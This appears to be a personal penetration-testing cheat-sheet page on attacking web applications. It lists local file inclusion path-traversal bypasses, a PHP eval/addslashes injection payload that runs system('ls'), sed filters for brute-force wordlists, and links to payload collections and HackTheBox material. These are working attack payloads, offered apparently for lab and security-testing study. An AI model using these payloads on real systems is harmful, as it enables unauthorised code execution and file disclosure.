---
title: "Web"
date: 2023-01-03
modified: 2023-03-06
draft: false
summary: "Attacking web applications."
---

{{< hacking-disclaimer >}}

## Local file inclusion

- `../` specific find/replace can be bypassed with `..//`
- e.g. `/uploads/%2e%2e/%2fsys/class/net/eth0/address` → `/uploads/..//sys/class/net/eth0/address`
- Resolve a network path = `http://host.tld/?page=//11.22.33.44/@OsandaMalith`

## PHP - Bypass `eval()` with `addslashes()`

Where a value from a URL is passed through `eval()` with `addslashes()`

POC: `?str=${eval($_GET[1])}&1=phpinfo();`

For example: `GET /?format=${eval($_GET[1])}&1=system('ls');`

[https://www.programmersought.com/article/30723400042/](https://www.programmersought.com/article/30723400042/)

## Command injection

### Characters

See <https://academy.hackthebox.com/module/109/section/1032>

### Resources

- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
- [Bashfuscator](https://github.com/Bashfuscator/Bashfuscator)

## File upload

See <https://academy.hackthebox.com/module/136/section/1291>

## Brute forcing

- Hydra - [logins](https://academy.hackthebox.com/module/57/section/489) and [forms](https://academy.hackthebox.com/module/57/section/503).
- [CUPP](https://github.com/Mebus/cupp) - customized wordlists.
  - [Username Anarchy](https://github.com/urbanadventurer/username-anarchy) - username generator.
  - See also [other tools](https://academy.hackthebox.com/module/57/section/512).

If we know the password rules:

```shell
sed -ri '/^.{,7}$/d' words.txt # remove shorter than 8
sed -ri '/[!-/:-@\[-`\{-~]+/!d' words.txt # remove no special chars
sed -ri '/[0-9]+/!d' words.txt # remove no numbers
```
